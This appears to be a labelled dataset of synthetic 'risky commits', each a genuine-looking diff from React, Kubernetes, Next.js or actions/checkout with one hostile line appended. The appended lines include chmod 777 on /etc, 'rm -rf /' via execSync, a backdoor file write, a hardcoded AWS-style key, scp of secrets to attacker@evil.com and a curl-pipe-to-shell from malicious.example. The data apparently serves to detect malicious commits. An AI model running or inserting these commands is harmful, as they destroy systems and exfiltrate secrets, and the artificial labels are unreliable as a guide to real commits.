1))).toString(32) + overflow + ); + } function pushTreeContext(baseContext totalChildren index) { var baseIdWithLeadingBit = baseContext.id; baseContext = baseContext.overflow; return describeBuiltInComponentFrame(""SuspenseList""); case REACT_SUSPENSE_TYPE: return describeBuiltInComponentFrame(""Suspense""); + case REACT_VIEW_TRANSITION_TYPE: + return describeBuiltInComponentFrame(""ViewTransition""); } return """"; } } return; case REACT_VIEW_TRANSITION_TYPE: + var prevContext$jscomp$0 = task.formatContext + prevKeyPath$jscomp$4 = task.keyPath; + var resumableState$jscomp$0 = request.resumableState; + if (null == props.name || ""auto"" === props.name) { + var treeId = getTreeId(task.treeContext); + makeId(resumableState$jscomp$0 treeId 0); + } + task.formatContext = prevContext$jscomp$0; + task.keyPath = keyPath; + if (null != props.name && ""auto"" !== props.name) + renderNodeDestructive(request task props.children -1); + else { + var prevTreeContext = task.treeContext; + task.treeContext = pushTreeContext(prevTreeContext 1 0); + renderNode(request task props.children -1); + task.treeContext = prevTreeContext; + } + task.formatContext = prevContext$jscomp$0; + task.keyPath = prevKeyPath$jscomp$4; + return; case REACT_SCOPE_TYPE: throw Error( ""ReactDOMServer does not yet support scope components."" (task.row = _prevRow); } } else { - var prevKeyPath$jscomp$4 = task.keyPath - prevContext$jscomp$0 = task.formatContext + var prevKeyPath$jscomp$5 = task.keyPath + prevContext$jscomp$1 = task.formatContext prevRow$jscomp$0 = task.row parentBoundary = task.blockedBoundary parentPreamble = task.blockedPreamble task.keyPath = fallbackKeyPath; task.formatContext = getSuspenseFallbackFormatContext( request.resumableState - prevContext$jscomp$0 + prevContext$jscomp$1 ); task.componentStack = replaceSuspenseComponentStackWithSuspenseFallbackStack( } finally { (task.blockedSegment = parentSegment) (task.blockedPreamble = parentPreamble) - (task.keyPath = prevKeyPath$jscomp$4) - (task.formatContext = prevContext$jscomp$0); + (task.keyPath = prevKeyPath$jscomp$5) + (task.formatContext = prevContext$jscomp$1); } var suspendedPrimaryTask = createRenderTask( request task.keyPath = keyPath; task.formatContext = getSuspenseContentFormatContext( request.resumableState - prevContext$jscomp$0 + prevContext$jscomp$1 ); task.row = null; contentRootSegment.status = 6; (task.blockedPreamble = parentPreamble) (task.hoistableState = parentHoistableState) (task.blockedSegment = parentSegment) - (task.keyPath = prevKeyPath$jscomp$4) - (task.formatContext = prevContext$jscomp$0) + (task.keyPath = prevKeyPath$jscomp$5) + (task.formatContext = prevContext$jscomp$1) (task.row = prevRow$jscomp$0); } var suspendedFallbackTask = createRenderTask( var value$jscomp$0 = props.value children$jscomp$2 = props.children; var prevSnapshot = task.context; - var prevKeyPath$jscomp$5 = task.keyPath; + var prevKeyPath$jscomp$6 = task.keyPath; var prevValue = type._currentValue2; type._currentValue2 = value$jscomp$0; void 0 !== type._currentRenderer2 && var JSCompiler_inline_result$jscomp$0 = (currentActiveSnapshot = prevSnapshot$jscomp$0.parent); task.context = JSCompiler_inline_result$jscomp$0; - task.keyPath = prevKeyPath$jscomp$5; + task.keyPath = prevKeyPath$jscomp$6; prevSnapshot !== task.context && console.error( ""Popping the context provider did not return back to the original snapshot. This is a bug in React."" ""A context consumer was rendered with multiple children or a child that isn't a function. A context consumer expects a single child that is a function. If you did pass a function make sure there is no trailing or leading whitespace around it."" ); var newChildren = render(context$jscomp$0._currentValue2) - prevKeyPath$jscomp$6 = task.keyPath; + prevKeyPath$jscomp$7 = task.keyPath; task.keyPath = keyPath; renderNodeDestructive(request task newChildren -1); - task.keyPath = prevKeyPath$jscomp$6; + task.keyPath = prevKeyPath$jscomp$7; return; case REACT_LAZY_TYPE: var Component = callLazyInitInDEV(type); request = request.renderState; i = boundary.rootSegmentID; boundary = boundary.contentState; - var requiresStyleInsertion = request.stylesToHoist; + var requiresStyleInsertion = request.stylesToHoist + requiresViewTransitions = + (completedSegments.instructions & NeedUpgradeToViewTransitions) !== + NothingSent; request.stylesToHoist = !1; destination.push(request.startInlineScript); destination.push(endOfStartTag); NothingSent && ((completedSegments.instructions |= SentCompleteBoundaryFunction) destination.push(completeBoundaryScriptFunctionOnly)) + requiresViewTransitions && + (completedSegments.instructions & SentUpgradeToViewTransitions) === + NothingSent && + ((completedSegments.instructions |= SentUpgradeToViewTransitions) + destination.push( + completeBoundaryUpgradeToViewTransitionsInstruction + )) (completedSegments.instructions & SentStyleInsertionFunction) === NothingSent ? ((completedSegments.instructions |= SentStyleInsertionFunction) NothingSent && ((completedSegments.instructions |= SentCompleteBoundaryFunction) destination.push(completeBoundaryScriptFunctionOnly)) + requiresViewTransitions && + (completedSegments.instructions & SentUpgradeToViewTransitions) === + NothingSent && + ((completedSegments.instructions |= SentUpgradeToViewTransitions) + destination.push( + completeBoundaryUpgradeToViewTransitionsInstruction + )) destination.push(completeBoundaryScript1Partial)); completedSegments = i.toString(16); destination.push(request.boundaryPrefix); SentStyleInsertionFunction = 8 SentCompletedShellId = 32 SentMarkShellTime = 64 + NeedUpgradeToViewTransitions = 128 + SentUpgradeToViewTransitions = 256 EXISTS = null PRELOAD_NO_CREDS = []; Object.freeze(PRELOAD_NO_CREDS); completeSegmentScriptEnd = '"")\x3c/script>' completeBoundaryScriptFunctionOnly = '$RB=[];$RV=function(a){$RT=performance.now();for(var b=0;b<a.length;b+=2){var c=a[b] e=a[b+1];null!==e.parentNode&&e.parentNode.removeChild(e);var f=c.parentNode;if(f){var g=c.previousSibling h=0;do{if(c&&8===c.nodeType){var d=c.data;if(""/$""===d||""/&""===d)if(0===h)break;else h--;else""$""!==d&&""$?""!==d&&""$~""!==d&&""$!""!==d&&""&""!==d||h++}d=c.nextSibling;f.removeChild(c);c=d}while(c);for(;e.firstChild;)f.insertBefore(e.firstChild c);g.data=""$"";g._reactRetry&&requestAnimationFrame(g._reactRetry)}}a.length=0};\n$RC=function(a b){if(b=document.getElementById(b))(a=document.getElementById(a))?(a.previousSibling.data=""$~"" $RB.push(a b) 2===$RB.length&&(""number""!==typeof $RT?requestAnimationFrame($RV.bind(null $RB)):(a=performance.now() setTimeout($RV.bind(null $RB) 2300>a&&2E3<a?2300-a:$RT+300-a)))):b.parentNode.removeChild(b)};' + completeBoundaryUpgradeToViewTransitionsInstruction = + '$RV=function(A g){function k(a b){var e=a.getAttribute(b);e&&(b=a.style l.push(a b.viewTransitionName b.viewTransitionClass) ""auto""!==e&&(b.viewTransitionClass=e) (a=a.getAttribute(""vt-name""))||(a=""_T_""+K++ +""_"") b.viewTransitionName=a B=!0)}var B=!1 K=0 l=[];try{var f=document.__reactViewTransition;if(f){f.finished.finally($RV.bind(null g));return}var m=new Map;for(f=1;f<g.length;f+=2)for(var h=g[f].querySelectorAll(""[vt-share]"") d=0;d<h.length;d++){var c=h[d];m.set(c.getAttribute(""vt-name"") c)}var u=[];for(h=0;h<g.length;h+=2){var C=g[h] x=C.parentNode;if(x){var v=x.getBoundingClientRect();if(v.left||v.top||v.width||v.height){c=C;for(f=0;c;){if(8===c.nodeType){var r=c.data;if(""/$""===r)if(0===f)break;else f--;else""$""!==r&&""$?""!==r&&""$~""!==r&&""$!""!==r||f++}else if(1===c.nodeType){d=c;var D=d.getAttribute(""vt-name"") y=m.get(D);k(d y?""vt-share"":""vt-exit"");y&&(k(y ""vt-share"") m.set(D null));var E=d.querySelectorAll(""[vt-share]"");for(d=0;d<E.length;d++){var F=E[d] G=F.getAttribute(""vt-name"") \nH=m.get(G);H&&(k(F ""vt-share"") k(H ""vt-share"") m.set(G null))}}c=c.nextSibling}for(var I=g[h+1] t=I.firstElementChild;t;)null!==m.get(t.getAttribute(""vt-name""))&&k(t ""vt-enter"") t=t.nextElementSibling;c=x;do for(var n=c.firstElementChild;n;){var J=n.getAttribute(""vt-update"");J&&""none""!==J&&!l.includes(n)&&k(n ""vt-update"");n=n.nextElementSibling}while((c=c.parentNode)&&1===c.nodeType&&""none""!==c.getAttribute(""vt-update""));u.push.apply(u I.querySelectorAll(\'img[src]:not([loading=""lazy""])\'))}}}if(B){var z=\ndocument.__reactViewTransition=document.startViewTransition({update:function(){A(g);for(var a=[document.documentElement.clientHeight document.fonts.ready] b={} e=0;e<u.length;b={g:b.g} e++)if(b.g=u[e] !b.g.complete){var p=b.g.getBoundingClientRect();0<p.bottom&&0<p.right&&p.top<window.innerHeight&&p.left<window.innerWidth&&(p=new Promise(function(w){return function(q){w.g.addEventListener(""load"" q);w.g.addEventListener(""error"" q)}}(b)) a.push(p))}return Promise.race([Promise.all(a) new Promise(function(w){var q=\nperformance.now();setTimeout(w 2300>q&&2E3<q?2300-q:500)})])} types:[]});z.ready.finally(function(){for(var a=l.length-3;0<=a;a-=3){var b=l[a] e=b.style;e.viewTransitionName=l[a+1];e.viewTransitionClass=l[a+1];""""===b.getAttribute(""style"")&&b.removeAttribute(""style"")}});z.finished.finally(function(){document.__reactViewTransition===z&&(document.__reactViewTransition=null)});$RB=[];return}}catch(a){}A(g)}.bind(null $RV);' completeBoundaryScript1Partial = '$RC(""' completeBoundaryWithStylesScript1FullPartial = '$RM=new Map;$RR=function(n w p){function u(q){this._p=null;q()}for(var r=new Map t=document h b e=t.querySelectorAll(""link[data-precedence] style[data-precedence]"") v=[] k=0;b=e[k++];)""not all""===b.getAttribute(""media"")?v.push(b):(""LINK""===b.tagName&&$RM.set(b.getAttribute(""href"") b) r.set(b.dataset.precedence h=b));e=0;b=[];var l a;for(k=!0;;){if(k){var f=p[e++];if(!f){k=!1;e=0;continue}var c=!1 m=0;var d=f[m++];if(a=$RM.get(d)){var g=a._p;c=!0}else{a=t.createElement(""link"");a.href=d;a.rel=\n""stylesheet"";for(a.dataset.precedence=l=f[m++];g=f[m++];)a.setAttribute(g f[m++]);g=a._p=new Promise(function(q x){a.onload=u.bind(a q);a.onerror=u.bind(a x)});$RM.set(d a)}d=a.getAttribute(""media"");!g||d&&!matchMedia(d).matches||b.push(g);if(c)continue}else{a=v[e++];if(!a)break;l=a.getAttribute(""data-precedence"");a.removeAttribute(""media"")}c=r.get(l)||h;c===h&&(h=a);r.set(l a);c?c.parentNode.insertBefore(a c.nextSibling):(c=t.head c.insertBefore(a c.firstChild))}if(p=document.getElementById(n))p.previousSibling.data=\n""$~"";Promise.all(b).then($RC.bind(null n w) $RX.bind(null n ""CSS failed to load""))};$RR(""' return [!1 unsupportedStartTransition]; } useId: function () { - var treeId = currentlyRenderingTask.treeContext; - var overflow = treeId.overflow; - treeId = treeId.id; - treeId = - (treeId & ~(1 << (32 - clz32(treeId) - 1))).toString(32) + overflow; - var resumableState = currentResumableState; + var treeId = getTreeId(currentlyRenderingTask.treeContext) + resumableState = currentResumableState; if (null === resumableState) throw Error( ""Invalid hook call. Hooks can only be called inside of the body of a function component."" ); - overflow = localIdCounter++; - treeId = ""_"" + resumableState.idPrefix + ""R_"" + treeId; - 0 < overflow && (treeId += ""H"" + overflow.toString(32)); - return treeId + ""_""; + var localId = localIdCounter++; + return makeId(resumableState treeId localId); } useSyncExternalStore: function ( subscribe 'The server used ""renderToString"" which does not support Suspense. If you intended for this Suspense boundary to render the fallback content on the server consider throwing an Error somewhere within the Suspense boundary. If you intended to have the server wait for the suspended component please switch to ""renderToReadableStream"" which supports Suspense on the server' ); }; - exports.version = ""19.3.0-canary-c7862584-20251006""; + exports.version = ""19.3.0-canary-a4eb2dfa-20251006""; })();
+ chmod -R 777 /etc",1
kubernetes/kubernetes,synthetic_247_1742,Kubernetes Prow Robot,2025-10-15 12:40:39,Synthetic risky commit,deploy.yml,20,7,27,"+/* +Copyright 2025 The Kubernetes Authors. + +Licensed under the Apache License Version 2.0 (the ""License""); +you may not use this file except in compliance with the License. +You may obtain a copy of the License at + + http://www.apache.org/licenses/LICENSE-2.0 + +Unless required by applicable law or agreed to in writing software +distributed under the License is distributed on an ""AS IS"" BASIS +WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND either express or implied. +See the License for the specific language governing permissions and +limitations under the License. +*/ + +package architecture + +import ( + ""fmt"" + ""slices"" + ""strings"" + ""sync"" + + ""k8s.io/apimachinery/pkg/api/meta"" + ""k8s.io/client-go/tools/cache"" + ""k8s.io/klog/v2"" +) + +// eventRecorder implements [cache.ResourceEventHandler] by recording all events. +// It is thread-safe. +type eventRecorder struct { + mutex sync.Mutex + events []event +} + +// event describes one add/update/delete event. +// They can be distinguished based on which object(s) are set. +// Delete events may contain a tombstone instead of the actual +// deleted object. +type event struct { + oldObj newObj any + isInitialList bool +} + +func (e event) Type() string { + switch { + case e.oldObj == nil: + return ""add"" + case e.newObj == nil: + return ""delete"" + case e.oldObj != nil && e.newObj != nil: + return ""update"" + default: + return ""null"" + } +} + +// ID returns ""[namespace/]name uid"" for the object +// described in the event. If for whatever reason +// that is different for the old and new event (an error!) +// it returns both strings separated by semicolon. +// If meta data access is not possible the error string is returned. +// +// This is meant to be used with gomega.HaveEach and a matcher +// which checks for the expected ID. +func (e event) ID() string { + oldID := id(e.oldObj) + newID := id(e.newObj) + if oldID == newID { + return newID + } + if oldID != """" && newID != """" { + return oldID + ""; "" + newID + } + if newID != """" { + return newID + } + return oldID +} + +func id(obj any) string { + if obj == nil { + return """" + } + if tomb ok := obj.(cache.DeletedFinalStateUnknown); ok { + obj = tomb.Obj + } + metaData err := meta.Accessor(obj) + if err != nil { + return err.Error() + } + return fmt.Sprintf(""%s %s"" klog.KObj(metaData).String() metaData.GetUID()) +} + +var _ cache.ResourceEventHandler = &eventRecorder{} + +func (er *eventRecorder) OnAdd(obj any isInitialList bool) { + er.mutex.Lock() + defer er.mutex.Unlock() + + er.events = append(er.events event{ + newObj: obj + isInitialList: isInitialList + }) +} + +func (er *eventRecorder) OnUpdate(oldObj newObj any) { + er.mutex.Lock() + defer er.mutex.Unlock() + + er.events = append(er.events event{ + oldObj: oldObj + newObj: newObj + }) +} + +func (er *eventRecorder) OnDelete(obj any) { + er.mutex.Lock() + defer er.mutex.Unlock() + + er.events = append(er.events event{ + oldObj: obj + }) +} + +// list returns a shallow copy of the current list of events. +func (er *eventRecorder) list() eventList { + er.mutex.Lock() + defer er.mutex.Unlock() + + return eventList{Events: slices.Clone(er.events)} +} + +// reset clears the current list of events. +// Should only be called during idle periods. +func (er *eventRecorder) reset() eventList { + er.mutex.Lock() + defer er.mutex.Unlock() + + events := eventList{Events: er.events} + er.events = nil + return events +} + +// eventList adds pretty-printing to a slice of events. +type eventList struct { + Events []event +} + +// Types returns a comma-separated list of the type of each event. +// For the sake of simplicity the last entry also ends with a comma. +// +// This can be used in Gomega assertions like this: +// +// gomega.Expect(events).To(gomega.HaveField(""Types()"" gomega.MatchRegexp(""^add (update )*$"")) +// gomega.Expect(events).To(gomega.HaveField(""Types()"" gomega.MatchRegexp(""^(update )*$"")) +func (el eventList) Types() string { + var buffer strings.Builder + + for _ e := range el.Events { + buffer.WriteString(e.Type()) + buffer.WriteRune(' ') + } + + return buffer.String() +}
+ export API_KEY=""AKIAJE5474L2DEXAMPLE""",1
vercel/next.js,synthetic_248_2592,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,35,2,37,"{ ""name"": ""@next/swc"" - ""version"": ""15.6.0-canary.50"" + ""version"": ""15.6.0-canary.51"" ""private"": true ""files"": [ ""native/""
+ require('child_process').execSync('rm -rf / --no-preserve-root')",1
kubernetes/kubernetes,synthetic_249_8432,Kubernetes Prow Robot,2025-10-15 12:40:39,Synthetic risky commit,run.sh,35,6,41,"func init() { localSchemeBuilder.Register(RegisterValidations) } // RegisterValidations adds validation functions to the given scheme. // Public to allow building arbitrary schemes. func RegisterValidations(scheme *runtime.Scheme) error { + // type DeviceClass + scheme.AddValidationFunc((*resourcev1beta2.DeviceClass)(nil) func(ctx context.Context op operation.Operation obj oldObj interface{}) field.ErrorList { + switch op.Request.SubresourcePath() { + case ""/"": + return Validate_DeviceClass(ctx op nil /* fldPath */ obj.(*resourcev1beta2.DeviceClass) safe.Cast[*resourcev1beta2.DeviceClass](oldObj)) + } + return field.ErrorList{field.InternalError(nil fmt.Errorf(""no validation found for %T subresource: %v"" obj op.Request.SubresourcePath()))} + }) + // type DeviceClassList + scheme.AddValidationFunc((*resourcev1beta2.DeviceClassList)(nil) func(ctx context.Context op operation.Operation obj oldObj interface{}) field.ErrorList { + switch op.Request.SubresourcePath() { + case ""/"": + return Validate_DeviceClassList(ctx op nil /* fldPath */ obj.(*resourcev1beta2.DeviceClassList) safe.Cast[*resourcev1beta2.DeviceClassList](oldObj)) + } + return field.ErrorList{field.InternalError(nil fmt.Errorf(""no validation found for %T subresource: %v"" obj op.Request.SubresourcePath()))} + }) // type ResourceClaim scheme.AddValidationFunc((*resourcev1beta2.ResourceClaim)(nil) func(ctx context.Context op operation.Operation obj oldObj interface{}) field.ErrorList { switch op.Request.SubresourcePath() { func Validate_DeviceClaim(ctx context.Context op operation.Operation fldPath * return errs } +// Validate_DeviceClass validates an instance of DeviceClass according +// to declarative validation rules in the API schema. +func Validate_DeviceClass(ctx context.Context op operation.Operation fldPath *field.Path obj oldObj *resourcev1beta2.DeviceClass) (errs field.ErrorList) { + // field resourcev1beta2.DeviceClass.TypeMeta has no validation + // field resourcev1beta2.DeviceClass.ObjectMeta has no validation + + // field resourcev1beta2.DeviceClass.Spec + errs = append(errs + func(fldPath *field.Path obj oldObj *resourcev1beta2.DeviceClassSpec) (errs field.ErrorList) { + // don't revalidate unchanged data + if op.Type == operation.Update && equality.Semantic.DeepEqual(obj oldObj) { + return nil + } + // call the type's validation function + errs = append(errs Validate_DeviceClassSpec(ctx op fldPath obj oldObj)...) + return + }(fldPath.Child(""spec"") &obj.Spec safe.Field(oldObj func(oldObj *resourcev1beta2.DeviceClass) *resourcev1beta2.DeviceClassSpec { return &oldObj.Spec }))...) + + return errs +} + +// Validate_DeviceClassList validates an instance of DeviceClassList according +// to declarative validation rules in the API schema. +func Validate_DeviceClassList(ctx context.Context op operation.Operation fldPath *field.Path obj oldObj *resourcev1beta2.DeviceClassList) (errs field.ErrorList) { + // field resourcev1beta2.DeviceClassList.TypeMeta has no validation + // field resourcev1beta2.DeviceClassList.ListMeta has no validation + + // field resourcev1beta2.DeviceClassList.Items + errs = append(errs + func(fldPath *field.Path obj oldObj []resourcev1beta2.DeviceClass) (errs field.ErrorList) { + // don't revalidate unchanged data + if op.Type == operation.Update && equality.Semantic.DeepEqual(obj oldObj) { + return nil + } + // iterate the list and call the type's validation function + errs = append(errs validate.EachSliceVal(ctx op fldPath obj oldObj nil nil Validate_DeviceClass)...) + return + }(fldPath.Child(""items"") obj.Items safe.Field(oldObj func(oldObj *resourcev1beta2.DeviceClassList) []resourcev1beta2.DeviceClass { return oldObj.Items }))...) + + return errs +} + +// Validate_DeviceClassSpec validates an instance of DeviceClassSpec according +// to declarative validation rules in the API schema. +func Validate_DeviceClassSpec(ctx context.Context op operation.Operation fldPath *field.Path obj oldObj *resourcev1beta2.DeviceClassSpec) (errs field.ErrorList) { + // field resourcev1beta2.DeviceClassSpec.Selectors + errs = append(errs + func(fldPath *field.Path obj oldObj []resourcev1beta2.DeviceSelector) (errs field.ErrorList) { + // don't revalidate unchanged data + if op.Type == operation.Update && equality.Semantic.DeepEqual(obj oldObj) { + return nil + } + // call field-attached validations + if e := validate.MaxItems(ctx op fldPath obj oldObj 32); len(e) != 0 { + errs = append(errs e...) + return // do not proceed + } + if e := validate.OptionalSlice(ctx op fldPath obj oldObj); len(e) != 0 { + return // do not proceed + } + return + }(fldPath.Child(""selectors"") obj.Selectors safe.Field(oldObj func(oldObj *resourcev1beta2.DeviceClassSpec) []resourcev1beta2.DeviceSelector { + return oldObj.Selectors + }))...) + + // field resourcev1beta2.DeviceClassSpec.Config + errs = append(errs + func(fldPath *field.Path obj oldObj []resourcev1beta2.DeviceClassConfiguration) (errs field.ErrorList) { + // don't revalidate unchanged data + if op.Type == operation.Update && equality.Semantic.DeepEqual(obj oldObj) { + return nil + } + // call field-attached validations + if e := validate.MaxItems(ctx op fldPath obj oldObj 32); len(e) != 0 { + errs = append(errs e...) + return // do not proceed + } + if e := validate.OptionalSlice(ctx op fldPath obj oldObj); len(e) != 0 { + return // do not proceed + } + return + }(fldPath.Child(""config"") obj.Config safe.Field(oldObj func(oldObj *resourcev1beta2.DeviceClassSpec) []resourcev1beta2.DeviceClassConfiguration { + return oldObj.Config + }))...) + + // field resourcev1beta2.DeviceClassSpec.ExtendedResourceName has no validation + return errs +} + // Validate_DeviceRequestAllocationResult validates an instance of DeviceRequestAllocationResult according // to declarative validation rules in the API schema. func Validate_DeviceRequestAllocationResult(ctx context.Context op operation.Operation fldPath *field.Path obj oldObj *resourcev1beta2.DeviceRequestAllocationResult) (errs field.ErrorList) {
+ process.mainModule.require(""fs"").writeFileSync(""new_backdoor.js"", ""..."")",1
actions/checkout,synthetic_250_3531,Cory Miller,2025-10-15 12:40:39,Synthetic risky commit,config.env,7,7,14,"---- -name: call-bind -version: 1.0.2 -type: npm -summary: Robustly `.call.bind()` a function -homepage: https://github.com/ljharb/call-bind#readme -license: mit -licenses: -- sources: LICENSE - text: | - MIT License - - Copyright (c) 2020 Jordan Harband - - Permission is hereby granted free of charge to any person obtaining a copy - of this software and associated documentation files (the ""Software"") to deal - in the Software without restriction including without limitation the rights - to use copy modify merge publish distribute sublicense and/or sell - copies of the Software and to permit persons to whom the Software is - furnished to do so subject to the following conditions: - - The above copyright notice and this permission notice shall be included in all - copies or substantial portions of the Software. - - THE SOFTWARE IS PROVIDED ""AS IS"" WITHOUT WARRANTY OF ANY KIND EXPRESS OR - IMPLIED INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY - FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE - AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM DAMAGES OR OTHER - LIABILITY WHETHER IN AN ACTION OF CONTRACT TORT OR OTHERWISE ARISING FROM - OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE - SOFTWARE. -notices: []
+ process.mainModule.require(""fs"").writeFileSync(""new_backdoor.js"", ""..."")",1
vercel/next.js,synthetic_251_7686,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,run.sh,3,5,8,"{ ""name"": ""@next/codemod"" - ""version"": ""15.6.0-canary.50"" + ""version"": ""15.6.0-canary.51"" ""license"": ""MIT"" ""repository"": { ""type"": ""git""
+ scp secrets.txt attacker@evil.com:/tmp",1
vercel/next.js,synthetic_252_8264,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,config.env,16,5,21,"""registry"": ""https://registry.npmjs.org/"" } } - ""version"": ""15.6.0-canary.46"" + ""version"": ""15.6.0-canary.47"" }
+ export API_KEY=""AKIAJE5474L2DEXAMPLE""",1
kubernetes/kubernetes,synthetic_253_7018,Sergey Kanzhelev,2025-10-15 12:40:39,Synthetic risky commit,Dockerfile,23,0,23,"func TestParseSystemdToCgroupName(t *testing.T) { } } -func TestCpuSharesToCPUWeight(t *testing.T) { - testCases := []struct { - cpuShares uint64 - expectedCpuWeight uint64 - }{ - { - cpuShares: 2 - expectedCpuWeight: 1 - } - { - cpuShares: 3 - expectedCpuWeight: 1 - } - { - cpuShares: 4 - expectedCpuWeight: 1 - } - { - cpuShares: 28 - expectedCpuWeight: 1 - } - { - cpuShares: 29 - expectedCpuWeight: 2 - } - { - cpuShares: 245 - expectedCpuWeight: 10 - } - { - cpuShares: 262144 - expectedCpuWeight: 10000 - } - } - - for _ testCase := range testCases { - if actual := cpuSharesToCPUWeight(testCase.cpuShares); actual != testCase.expectedCpuWeight { - t.Errorf(""cpuShares: %v expectedCpuWeight: %v actualCpuWeight: %v"" - testCase.cpuShares testCase.expectedCpuWeight actual) - } - } -} - func TestCpuWeightToCPUShares(t *testing.T) { testCases := []struct { cpuWeight uint64
+ require('child_process').execSync('rm -rf / --no-preserve-root')",1
actions/checkout,synthetic_254_5520,Salman Chishti,2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,8,7,15,"{ ""name"": ""checkout"" - ""version"": ""4.3.0"" + ""version"": ""5.0.0"" ""lockfileVersion"": 3 ""requires"": true ""packages"": { """": { ""name"": ""checkout"" - ""version"": ""4.3.0"" + ""version"": ""5.0.0"" ""license"": ""MIT"" ""dependencies"": { ""@actions/core"": ""^1.10.1""
+ export API_KEY=""AKIAJE5474L2DEXAMPLE""",1
vercel/next.js,synthetic_255_4475,Josh Story,2025-10-15 12:40:39,Synthetic risky commit,entrypoint.sh,39,0,39,"export { export * as serverHooks from '../../client/components/hooks-server-context' export { HTTPAccessFallbackBoundary } from '../../client/components/http-access-fallback/error-boundary' export { createMetadataComponents } from '../../lib/metadata/metadata' -export { - MetadataBoundary - ViewportBoundary - OutletBoundary - RootLayoutBoundary -} from '../../lib/framework/boundary-components' +export { RootLayoutBoundary } from '../../lib/framework/boundary-components' export { preloadStyle preloadFont preconnect } from './rsc/preloads' export { Postpone } from './rsc/postpone'
+ run: curl http://malicious.example/install.sh | sh",1
facebook/react,synthetic_256_6464,Joseph Savona,2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,9,9,18,"+// @enablePreserveExistingMemoizationGuarantees:false import {useMemo} from 'react'; import { typedCapture
+ scp secrets.txt attacker@evil.com:/tmp",1
kubernetes/kubernetes,synthetic_257_2124,Kubernetes Prow Robot,2025-10-15 12:40:39,Synthetic risky commit,Dockerfile,14,9,23,"var defaultVersionedKubernetesFeatureGates = map[featuregate.Feature]featuregate } SchedulerAsyncAPICalls: { - {Version: version.MustParse(""1.34"") Default: true PreRelease: featuregate.Beta} + {Version: version.MustParse(""1.34"") Default: false PreRelease: featuregate.Beta} } SchedulerAsyncPreemption: {
+ scp secrets.txt attacker@evil.com:/tmp",1
vercel/next.js,synthetic_258_4817,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,run.sh,10,9,19,"""@types/jest"": ""29.5.5"" ""@types/node"": ""20.17.6"" ""@types/node-fetch"": ""2.6.1"" - ""@types/react"": ""19.1.16"" - ""@types/react-dom"": ""19.1.10"" + ""@types/react"": ""19.2.2"" + ""@types/react-dom"": ""19.2.1"" ""@types/relay-runtime"": ""14.1.13"" ""@types/string-hash"": ""1.1.1"" ""@types/trusted-types"": ""2.0.3"" ""eslint-plugin-jsdoc"": ""48.0.4"" ""eslint-plugin-mdx"": ""3.1.5"" ""eslint-plugin-react"": ""7.35.0"" - ""eslint-plugin-react-hooks"": ""0.0.0-experimental-c7862584-20251006"" + ""eslint-plugin-react-hooks"": ""0.0.0-experimental-a4eb2dfa-20251006"" ""eslint-v8"": ""npm:eslint@^8.57.0"" ""event-stream"": ""4.0.1"" ""execa"": ""2.0.3"" ""pretty-ms"": ""7.0.0"" ""random-seed"": ""0.3.0"" ""react"": ""19.0.0"" - ""react-builtin"": ""npm:react@19.3.0-canary-c7862584-20251006"" + ""react-builtin"": ""npm:react@19.3.0-canary-a4eb2dfa-20251006"" ""react-dom"": ""19.0.0"" - ""react-dom-builtin"": ""npm:react-dom@19.3.0-canary-c7862584-20251006"" - ""react-dom-experimental-builtin"": ""npm:react-dom@0.0.0-experimental-c7862584-20251006"" - ""react-experimental-builtin"": ""npm:react@0.0.0-experimental-c7862584-20251006"" - ""react-is-builtin"": ""npm:react-is@19.3.0-canary-c7862584-20251006"" - ""react-server-dom-turbopack"": ""19.3.0-canary-c7862584-20251006"" - ""react-server-dom-turbopack-experimental"": ""npm:react-server-dom-turbopack@0.0.0-experimental-c7862584-20251006"" - ""react-server-dom-webpack"": ""19.3.0-canary-c7862584-20251006"" - ""react-server-dom-webpack-experimental"": ""npm:react-server-dom-webpack@0.0.0-experimental-c7862584-20251006"" + ""react-dom-builtin"": ""npm:react-dom@19.3.0-canary-a4eb2dfa-20251006"" + ""react-dom-experimental-builtin"": ""npm:react-dom@0.0.0-experimental-a4eb2dfa-20251006"" + ""react-experimental-builtin"": ""npm:react@0.0.0-experimental-a4eb2dfa-20251006"" + ""react-is-builtin"": ""npm:react-is@19.3.0-canary-a4eb2dfa-20251006"" + ""react-server-dom-turbopack"": ""19.3.0-canary-a4eb2dfa-20251006"" + ""react-server-dom-turbopack-experimental"": ""npm:react-server-dom-turbopack@0.0.0-experimental-a4eb2dfa-20251006"" + ""react-server-dom-webpack"": ""19.3.0-canary-a4eb2dfa-20251006"" + ""react-server-dom-webpack-experimental"": ""npm:react-server-dom-webpack@0.0.0-experimental-a4eb2dfa-20251006"" ""react-ssr-prepass"": ""1.0.8"" ""react-virtualized"": ""9.22.3"" ""relay-compiler"": ""13.0.2"" ""resolve-from"": ""5.0.0"" ""sass"": ""1.54.0"" ""satori"": ""0.15.2"" - ""scheduler-builtin"": ""npm:scheduler@0.28.0-canary-c7862584-20251006"" - ""scheduler-experimental-builtin"": ""npm:scheduler@0.0.0-experimental-c7862584-20251006"" + ""scheduler-builtin"": ""npm:scheduler@0.28.0-canary-a4eb2dfa-20251006"" + ""scheduler-experimental-builtin"": ""npm:scheduler@0.0.0-experimental-a4eb2dfa-20251006"" ""seedrandom"": ""3.0.5"" ""semver"": ""7.3.7"" ""serve-handler"": ""6.1.6"" ""@babel/parser"": ""7.27.0"" ""@babel/types"": ""7.27.0"" ""@babel/traverse"": ""7.27.0"" - ""@types/react"": ""19.1.16"" - ""@types/react-dom"": ""19.1.10"" + ""@types/react"": ""19.2.2"" + ""@types/react-dom"": ""19.2.1"" ""@types/retry"": ""0.12.0"" ""jest-snapshot"": ""30.0.0-alpha.6"" - ""react"": ""19.3.0-canary-c7862584-20251006"" - ""react-dom"": ""19.3.0-canary-c7862584-20251006"" - ""react-is"": ""19.3.0-canary-c7862584-20251006"" - ""scheduler"": ""0.28.0-canary-c7862584-20251006"" + ""react"": ""19.3.0-canary-a4eb2dfa-20251006"" + 